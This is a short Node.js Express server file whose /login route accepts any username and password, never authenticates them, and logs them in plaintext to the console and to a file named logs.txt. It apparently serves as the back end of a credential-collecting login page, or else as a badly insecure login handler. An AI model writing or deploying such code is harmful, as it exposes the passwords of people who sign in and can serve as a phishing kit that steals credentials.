const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const fs = require("fs");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, "public")));

// Function to log data to a file
const logData = (username, password) => {
  const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
  fs.appendFile("logs.txt", logEntry, (err) => {
    if (err) {
      console.error("Error writing to log file:", err);
    }
  });
};

// Routes
app.post("/login", async (req, res) => {
  console.log("POST /login");
  console.log("Request Body:", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    // Save the data to logs.txt instead of MongoDB
    logData(username, password);

    res.status(200).send("Data saved to logs successfully");
  } catch (err) {
    console.error("Error saving user:", err);
    return res.status(500).send("Error saving user to logs");
  }
});

// Serve the HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
